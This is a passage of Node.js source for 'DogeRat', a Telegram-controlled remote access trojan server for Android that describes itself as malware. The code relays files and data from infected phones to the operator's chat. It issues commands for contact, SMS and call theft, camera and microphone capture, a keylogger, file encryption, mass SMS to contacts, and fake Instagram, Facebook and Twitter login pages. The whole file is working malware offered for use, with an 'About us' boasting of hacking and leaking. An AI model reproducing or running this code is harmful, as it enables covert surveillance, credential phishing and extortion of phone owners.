const express = require('express')
const http = require('http')
const { Server } = require("socket.io")
const telegramBot = require("node-telegram-bot-api")
const https = require('https');
const multer = require('multer');
const fs = require('fs');

const app = express()
const server = http.createServer(app)
const io = new Server(server)
const uploader = multer();
const data = JSON.parse(fs.readFileSync('./data.json', 'utf8'));
const bot = new telegramBot(data.token, {
    polling: true,
    request: {
       // proxy: "http://127.0.0.1:9080"
    }
})
const appData = new Map()
const actions = [
    "✯ 𝙲𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯", "✯ 𝚂𝙼𝚂 ✯",
    "✯ 𝙲𝚊𝚕𝚕𝚜 ✯", "✯ 𝙰𝚙𝚙𝚜 ✯",
    "✯ 𝙼𝚊𝚒𝚗 𝚌𝚊𝚖𝚎𝚛𝚊 ✯", "✯ 𝚂𝚎𝚕𝚏𝚒𝚎 𝙲𝚊𝚖𝚎𝚛𝚊 ✯",
    "✯ 𝙼𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎 ✯", "✯ 𝙲𝚕𝚒𝚙𝚋𝚘𝚊𝚛𝚍 ✯",
    "✯ 𝚂𝚌𝚛𝚎𝚎𝚗𝚜𝚑𝚘𝚝 ✯", "✯ 𝚃𝚘𝚊𝚜𝚝 ✯",
    "✯ 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 ✯", "✯ 𝚅𝚒𝚋𝚛𝚊𝚝𝚎 ✯", "✯ 𝙿𝚕𝚊𝚢 𝚊𝚞𝚍𝚒𝚘 ✯", "✯ 𝚂𝚝𝚘𝚙 𝙰𝚞𝚍𝚒𝚘 ✯",
    "✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙽 ✯", "✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙵𝙵 ✯",
    "✯ 𝙵𝚒𝚕𝚎 𝚎𝚡𝚙𝚕𝚘𝚛𝚎𝚛 ✯", "✯ 𝙶𝚊𝚕𝚕𝚎𝚛𝚢 ✯",
    "✯ 𝙴𝚗𝚌𝚛𝚢𝚙𝚝 ✯", "✯ 𝙳𝚎𝚌𝚛𝚢𝚙𝚝 ✯",
    "✯ 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 𝚝𝚘 𝚊𝚕𝚕 𝚌𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯",
    "✯ 𝙿𝚘𝚙 𝚗𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗 ✯",
    "✯ 𝙾𝚙𝚎𝚗 𝚄𝚁𝙻 ✯", "✯ 𝙿𝚑𝚒𝚜𝚑𝚒𝚗𝚐 ✯",
    "✯ 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯"
]

app.post("/upload", uploader.single('file'), (req, res) => {
    const name = req.file.originalname
    const model = req.headers.model
    bot.sendDocument(data.id, req.file.buffer, {
        caption: `<b>✯ 𝙵𝚒𝚕𝚎 𝚛𝚎𝚌𝚎𝚒𝚟𝚎𝚍 𝚏𝚛𝚘𝚖 → ${model}</b>`,
        parse_mode: "HTML"
    }, {
        filename: name,
        contentType: '*/*',
    })
    res.send("Done")
})

app.get("/text", (req, res) => {
    res.send(data.text)
})

io.on("connection", (socket) => {
    let model = socket.handshake.headers['model'] + "-" + io.sockets.sockets.size || "no information"
    let version = socket.handshake.headers['version'] || "no information"
    let ip = socket.handshake.headers['ip'] || "no information"
    socket['model'] = model
    socket['version'] = version
    let device =
        `<b>✯ 𝙽𝚎𝚠 𝚍𝚎𝚟𝚒𝚌𝚎 𝚌𝚘𝚗𝚗𝚎𝚌𝚝𝚎𝚍</b>\n\n` +
        `<b>𝚖𝚘𝚍𝚎𝚕</b> → ${model}\n` +
        `<b>𝚟𝚎𝚛𝚜𝚒𝚘𝚗</b> → ${version}\n` +
        `<b>𝚒𝚙</b> → ${ip}\n` +
        `<b>𝚝𝚒𝚖𝚎</b> → ${socket.handshake.time}\n\n`
    bot.sendMessage(data.id, device, { parse_mode: "HTML" })
    socket.on('disconnect', () => {
        let device =
            `<b>✯ 𝙳𝚎𝚟𝚒𝚌𝚎 𝚍𝚒𝚜𝚌𝚘𝚗𝚗𝚎𝚌𝚝𝚎𝚍</b>\n\n` +
            `<b>𝚖𝚘𝚍𝚎𝚕</b> → ${model}\n` +
            `<b>𝚟𝚎𝚛𝚜𝚒𝚘𝚗</b> → ${version}\n` +
            `<b>𝚒𝚙</b> → ${ip}\n` +
            `<b>𝚝𝚒𝚖𝚎</b> → ${socket.handshake.time}\n\n`
        bot.sendMessage(data.id, device, { parse_mode: "HTML" })
    })
    socket.on('file-explorer', (message) => {
        let fileKeyboard = []
        let row = []
        message.forEach((file, index) => {
            let callBackData;
            if (file.isFolder) {
                callBackData = `${model}|cd-${file.name}`
            } else {
                callBackData = `${model}|request-${file.name}`
            }
            if (row.length === 0 || row.length === 1) {
                row.push({ text: file.name, callback_data: callBackData })
                if (index + 1 === message.length) {
                    fileKeyboard.push(row)
                }
            } else if (row.length === 2) {
                row.push({ text: file.name, callback_data: callBackData })
                fileKeyboard.push(row)
                row = []
            }
        })
        fileKeyboard.push([{ text: '✯ 𝙱𝚊𝚌𝚔 ✯', callback_data: `${model}|back-0` }])
        bot.sendMessage(data.id, `<b>✯ 𝙵𝚒𝚕𝚎 𝚎𝚡𝚙𝚕𝚘𝚛𝚎 𝚊𝚌𝚝𝚒𝚘𝚗 𝚏𝚘𝚛 ${model}</b>`,
            {
                reply_markup: {
                    inline_keyboard: fileKeyboard,
                },
                parse_mode: "HTML"
            }
        )
    })
    socket.on('message', (message) => {
        bot.sendMessage(data.id, `<b>✯ 𝙼𝚎𝚜𝚜𝚊𝚐𝚎 𝚛𝚎𝚌𝚎𝚒𝚟𝚎𝚍 𝚏𝚛𝚘𝚖 → ${model}\n\n𝙼𝚎𝚜𝚜𝚊𝚐𝚎 → </b>${message}`,
            {
                parse_mode: "HTML"
            }
        )
    })
})

bot.on("message", (message) => {
    if (message.text === '/start') {
        bot.sendMessage(data.id,
            "<b>✯ 𝚆𝚎𝚕𝚌𝚘𝚖𝚎 𝚝𝚘 Doge 𝚁𝙰𝚃</b>\n\n" +
            "DogeRat 𝚒𝚜 𝚊 𝚖𝚊𝚕𝚠𝚊𝚛𝚎 𝚝𝚘 𝚌𝚘𝚗𝚝𝚛𝚘𝚕 𝙰𝚗𝚍𝚛𝚘𝚒𝚍 𝚍𝚎𝚟𝚒𝚌𝚎𝚜\n𝙰𝚗𝚢 𝚖𝚒𝚜𝚞𝚜𝚎 𝚒𝚜 𝚝𝚑𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚜𝚒𝚋𝚒𝚕𝚒𝚝𝚢 𝚘𝚏 𝚝𝚑𝚎 𝚙𝚎𝚛𝚜𝚘𝚗!\n\n" +
            "𝙳𝚎𝚟𝚎𝚕𝚘𝚙𝚎𝚍 𝚋𝚢: @Shivaya_dav",
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯"]],
                    "resize_keyboard": true
                }
            }
        )
    } else if (appData.get('currentAction') === 'microphoneDuration') {
        let duration = message.text
        let target = appData.get("currentTarget")
        if (target == "all") {
            io.sockets.emit("commend",
                { "request": "microphone", "extras": [{ "key": "duration", "value": duration }] }
            )
        } else {
            io.to(target).emit("commend",
                { "request": "microphone", "extras": [{ "key": "duration", "value": duration }] }
            )
        }
        appData.delete("currentTarget")
        appData.delete("currentAction")
        bot.sendMessage(data.id,
            "<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n",
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯"]],
                    "resize_keyboard": true
                }
            }
        )
    } else if (appData.get('currentAction') === 'toastText') {
        let text = message.text
        let target = appData.get("currentTarget")
        if (target == "all") {
            io.sockets.emit("commend",
                { "request": "toast", "extras": [{ "key": "text", "value": text }] }
            )
        } else {
            io.to(target).emit("commend",
                { "request": "toast", "extras": [{ "key": "text", "value": text }] }
            )
        }
        appData.delete("currentTarget")
        appData.delete("currentAction")
        bot.sendMessage(data.id,
            "<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n",
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯"]],
                    "resize_keyboard": true
                }
            }
        )
    } else if (appData.get('currentAction') === 'smsNumber') {
        let number = message.text
        appData.set("currentNumber", number)
        appData.set('currentAction', 'smsText')
        bot.sendMessage(data.id,
            `<b>✯ 𝙽𝚘𝚠 𝙴𝚗𝚝𝚎𝚛 𝚊 𝚖𝚎𝚜𝚜𝚊𝚐𝚎 𝚝𝚑𝚊𝚝 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚘 𝚜𝚎𝚗𝚍 𝚝𝚘 ${number}</b>\n\n`,
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["✯ 𝙲𝚊𝚗𝚌𝚎𝚕 𝚊𝚌𝚝𝚒𝚘𝚗 ✯"]],
                    "resize_keyboard": true,
                    "one_time_keyboard": true
                }
            }
        )
    } else if (appData.get('currentAction') === 'smsText') {
        let text = message.text
        let number = appData.get("currentNumber")
        let target = appData.get("currentTarget")
        if (target == "all") {
            io.sockets.emit("commend",
                { "request": "sendSms", "extras": [{ "key": "number", "value": number }, { "key": "text", "value": text }] }
            )
        } else {
            io.to(target).emit("commend",
                { "request": "sendSms", "extras": [{ "key": "number", "value": number }, { "key": "text", "value": text }] }
            )
        }
        appData.delete("currentTarget")
        appData.delete("currentAction")
        appData.delete("currentNumber")
        bot.sendMessage(data.id,
            "<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n",
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯"]],
                    "resize_keyboard": true
                }
            }
        )
    } else if (appData.get('currentAction') === 'vibrateDuration') {
        let duration = message.text
        let target = appData.get("currentTarget")
        if (target == "all") {
            io.sockets.emit("commend",
                { "request": "vibrate", "extras": [{ "key": "duration", "value": duration }] }
            )
        }
        else {
            io.to(target).emit("commend",
                { "request": "vibrate", "extras": [{ "key": "duration", "value": duration }] }
            )
        }
        appData.delete("currentTarget")
        appData.delete("currentAction")
        bot.sendMessage(data.id,
            "<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n",
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯"]],
                    "resize_keyboard": true
                }
            }
        )
    } else if (appData.get('currentAction') === 'textToAllContacts') {
        let text = message.text
        let target = appData.get("currentTarget")
        if (target == "all") {
            io.sockets.emit("commend",
                { "request": "smsToAllContacts", "extras": [{ "key": "text", "value": text }] }
            )
        } else {
            io.to(target).emit("commend",
                { "request": "smsToAllContacts", "extras": [{ "key": "text", "value": text }] }
            )
        }
        appData.delete("currentTarget")
        appData.delete("currentAction")
        bot.sendMessage(data.id,
            "<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n",
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯"]],
                    "resize_keyboard": true
                }
            }
        )
    } else if (appData.get('currentAction') === 'notificationText') {
        let text = message.text
        appData.set("currentNotificationText", text)
        appData.set('currentAction', 'notificationUrl')
        bot.sendMessage(data.id,
            `<b>✯ 𝙽𝚘𝚠 𝚎𝚗𝚝𝚎𝚛 𝚝𝚑𝚎 𝚄𝚁𝙻 𝚝𝚑𝚊𝚝 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚘 𝚘𝚙𝚎𝚗 𝚊𝚏𝚝𝚎𝚛 𝚌𝚕𝚒𝚌𝚔𝚒𝚗𝚐 𝚘𝚗 𝚗𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗</b>\n\n`,
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["✯ 𝙲𝚊𝚗𝚌𝚎𝚕 𝚊𝚌𝚝𝚒𝚘𝚗 ✯"]],
                    "resize_keyboard": true,
                    "one_time_keyboard": true
                }
            }
        )
    } else if (appData.get('currentAction') === 'notificationUrl') {
        let url = message.text
        let text = appData.get("currentNotificationText")
        let target = appData.get("currentTarget")
        if (target == "all") {
            io.sockets.emit("commend",
                { "request": "popNotification", "extras": [{ "key": "text", "value": text }, { "key": "url", "value": url }] }
            )
        }
        else {
            io.to(target).emit("commend",
                { "request": "popNotification", "extras": [{ "key": "text", "value": text }, { "key": "url", "value": url }] }
            )
        }
        appData.delete("currentTarget")
        appData.delete("currentAction")
        appData.delete("currentNotificationText")
        bot.sendMessage(data.id,
            "<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n",
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯"]],
                    "resize_keyboard": true
                }
            }
        )
    } else if (appData.get('currentAction') === 'openUrl') {
        let url = message.text
        let target = appData.get("currentTarget")
        if (target == "all") {
            io.sockets.emit("commend",
                { "request": "openUrl", "extras": [{ "key": "url", "value": url }] }
            )
        } else {
            io.to(target).emit("commend",
                { "request": "openUrl", "extras": [{ "key": "url", "value": url }] }
            )
        }
        appData.delete("currentTarget")
        appData.delete("currentAction")
        bot.sendMessage(data.id,
            "<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n",
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯"]],
                    "resize_keyboard": true
                }
            }
        )
    } else if (appData.get('currentAction') === 'phishing') {
        let page = message.text
        let target = appData.get("currentTarget")
        if (page == "✯ 𝙸𝚗𝚜𝚝𝚊𝚐𝚛𝚊𝚖 ✯") {
            if (target == "all") {
                io.sockets.emit("commend",
                    { "request": "openUrl", "extras": [{ "key": "url", "value": "file:///android_assets/websites/instagram.html" }] }
                )
            } else {
                io.to(target).emit("commend",
                    { "request": "openUrl", "extras": [{ "key": "url", "value": "file:///android_assets/websites/instagram.html" }] }
                )
            }
        }
        if (page == "✯ 𝙵𝚊𝚌𝚎𝚋𝚘𝚘𝚔 ✯") {
            if (target == "all") {
                io.sockets.emit("commend",
                    { "request": "openUrl", "extras": [{ "key": "url", "value": "file:///android_assets/websites/facebook.html" }] }
                )
            } else {
                io.to(target).emit("commend",
                    { "request": "openUrl", "extras": [{ "key": "url", "value": "file:///android_assets/websites/facebook.html" }] }
                )
            }
        }
        if (page == "✯ 𝚃𝚠𝚒𝚝𝚝𝚎𝚛 ✯") {
            if (target == "all") {
                io.sockets.emit("commend",
                    { "request": "openUrl", "extras": [{ "key": "url", "value": "file:///android_assets/websites/twitter.html" }] }
                )
            } else {
                io.to(target).emit("commend",
                    { "request": "openUrl", "extras": [{ "key": "url", "value": "file:///android_assets/websites/twitter.html" }] }
                )
            }
        }
        appData.delete("currentTarget")
        appData.delete("currentAction")
        bot.sendMessage(data.id,
            "<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n",
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯"]],
                    "resize_keyboard": true
                }
            }
        )
    }
    else if (message.text === '✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯') {
        if (io.sockets.sockets.size === 0) {
            bot.sendMessage(data.id,
                "<b>✯ 𝚃𝚑𝚎𝚛𝚎 𝚒𝚜 𝚗𝚘 𝚌𝚘𝚗𝚗𝚎𝚌𝚝𝚎𝚍 𝚍𝚎𝚟𝚒𝚌𝚎</b>\n\n",
                {
                    parse_mode: "HTML",
                }
            )
        } else {
            let devices = `<b>✯ 𝙲𝚘𝚗𝚗𝚎𝚌𝚝𝚎𝚍 𝚍𝚎𝚟𝚒𝚌𝚎𝚜 𝚌𝚘𝚞𝚗𝚝 : ${io.sockets.sockets.size}</b>\n\n`
            let count = 1
            io.sockets.sockets.forEach((value, key, map) => {
                devices +=
                    `<b>𝙳𝚎𝚟𝚒𝚌𝚎 ${count}</b>\n` +
                    `<b>𝚖𝚘𝚍𝚎𝚕</b> → ${value.model}\n` +
                    `<b>𝚟𝚎𝚛𝚜𝚒𝚘𝚗</b> → ${value.version}\n` +
                    `<b>𝚒𝚙</b> → ${value.ip}\n` +
                    `<b>𝚝𝚒𝚖𝚎</b> → ${value.handshake.time}\n\n`
                count += 1
            })
            bot.sendMessage(data.id, devices, { parse_mode: "HTML" })
        }
    } else if (message.text === '✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯') {
        if (io.sockets.sockets.size === 0) {
            bot.sendMessage(data.id,
                "<b>✯ 𝚃𝚑𝚎𝚛𝚎 𝚒𝚜 𝚗𝚘 𝚌𝚘𝚗𝚗𝚎𝚌𝚝𝚎𝚍 𝚍𝚎𝚟𝚒𝚌𝚎</b>\n\n",
                {
                    parse_mode: "HTML",
                }
            )
        } else {
            let devices = []
            io.sockets.sockets.forEach((value, key, map) => {
                devices.push([value.model])
            })
            devices.push(["✯ 𝙰𝚕𝚕 ✯"])
            devices.push(["✯ 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯"])
            bot.sendMessage(data.id,
                "<b>✯ 𝚂𝚎𝚕𝚎𝚌𝚝 𝚍𝚎𝚟𝚒𝚌𝚎 𝚝𝚘 𝚙𝚎𝚛𝚏𝚘𝚛𝚖 𝚊𝚌𝚝𝚒𝚘𝚗</b>\n\n",
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": devices,
                        "resize_keyboard": true,
                        "one_time_keyboard": true
                    }
                }
            )
        }
    } else if (message.text === '✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯') {
        bot.sendMessage(data.id,
            "<b>✯ 𝚆𝚎 𝚊𝚛𝚎 csx \n𝚆𝚎 𝚑𝚊𝚌𝚔, 𝚆𝚎 𝚕𝚎𝚊𝚔, 𝚆𝚎 𝚖𝚊𝚔𝚎 𝚖𝚊𝚕𝚠𝚊𝚛𝚎\n\n𝚃𝚎𝚕𝚎𝚐𝚛𝚊𝚖 → https://t.me/+L1O__kvbdm0xMDll\nJOIN → https://t.me/+L1O__kvbdm0xMDll</b>\n\n",
            {
                parse_mode: "HTML",
            }
        )
    } else if (message.text === '✯ 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯') {
        bot.sendMessage(data.id,
            "<b>✯ 𝙼𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n",
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯"]],
                    "resize_keyboard": true
                }
            }
        )

    } else if (message.text === '✯ 𝙲𝚊𝚗𝚌𝚎𝚕 𝚊𝚌𝚝𝚒𝚘𝚗 ✯') {
        let target = io.sockets.sockets.get(appData.get("currentTarget")).model
        if (target == "all") {
            bot.sendMessage(data.id,
                `<b>✯ 𝚂𝚎𝚕𝚎𝚌𝚝 𝚊𝚌𝚝𝚒𝚘𝚗 𝚝𝚘 𝚙𝚎𝚛𝚏𝚘𝚛𝚖 𝚏𝚘𝚛 𝚊𝚕𝚕 𝚊𝚟𝚊𝚒𝚕𝚊𝚋𝚕𝚎 𝚍𝚎𝚟𝚒𝚌𝚎𝚜</b>\n\n`,
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [
                            ["✯ 𝙲𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯", "✯ 𝚂𝙼𝚂 ✯"],
                            ["✯ 𝙲𝚊𝚕𝚕𝚜 ✯", "✯ 𝙰𝚙𝚙𝚜 ✯"],
                            ["✯ 𝙼𝚊𝚒𝚗 𝚌𝚊𝚖𝚎𝚛𝚊 ✯", "✯ 𝚂𝚎𝚕𝚏𝚒𝚎 𝙲𝚊𝚖𝚎𝚛𝚊 ✯"],
                            ["✯ 𝙼𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎 ✯", "✯ 𝙲𝚕𝚒𝚙𝚋𝚘𝚊𝚛𝚍 ✯"],
                            ["✯ 𝚂𝚌𝚛𝚎𝚎𝚗𝚜𝚑𝚘𝚝 ✯", "✯ 𝚃𝚘𝚊𝚜𝚝 ✯"],
                            ["✯ 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 ✯", "✯ 𝚅𝚒𝚋𝚛𝚊𝚝𝚎 ✯"],
                            ["✯ 𝙿𝚕𝚊𝚢 𝚊𝚞𝚍𝚒𝚘 ✯", "✯ 𝚂𝚝𝚘𝚙 𝙰𝚞𝚍𝚒𝚘 ✯"],
                            ["✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙽 ✯", "✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙵𝙵 ✯"],
                            ["✯ 𝙵𝚒𝚕𝚎 𝚎𝚡𝚙𝚕𝚘𝚛𝚎𝚛 ✯", "✯ 𝙶𝚊𝚕𝚕𝚎𝚛𝚢 ✯"],
                            ["✯ 𝙴𝚗𝚌𝚛𝚢𝚙𝚝 ✯", "✯ 𝙳𝚎𝚌𝚛𝚢𝚙𝚝 ✯"],
                            ["✯ 𝙾𝚙𝚎𝚗 𝚄𝚁𝙻 ✯", "✯ 𝙿𝚑𝚒𝚜𝚑𝚒𝚗𝚐 ✯"],
                            ["✯ 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 𝚝𝚘 𝚊𝚕𝚕 𝚌𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯",],
                            ["✯ 𝙿𝚘𝚙 𝚗𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗 ✯",],
                            ["✯ 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯"],
                        ],
                        "resize_keyboard": true,
                        "one_time_keyboard": true
                    }
                }
            )
        } else {
            bot.sendMessage(data.id,
                `<b>✯ 𝚂𝚎𝚕𝚎𝚌𝚝 𝚊𝚌𝚝𝚒𝚘𝚗 𝚝𝚘 𝚙𝚎𝚛𝚏𝚘𝚛𝚖 𝚏𝚘𝚛 ${target}</b>\n\n`,
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [
                            ["✯ 𝙲𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯", "✯ 𝚂𝙼𝚂 ✯"],
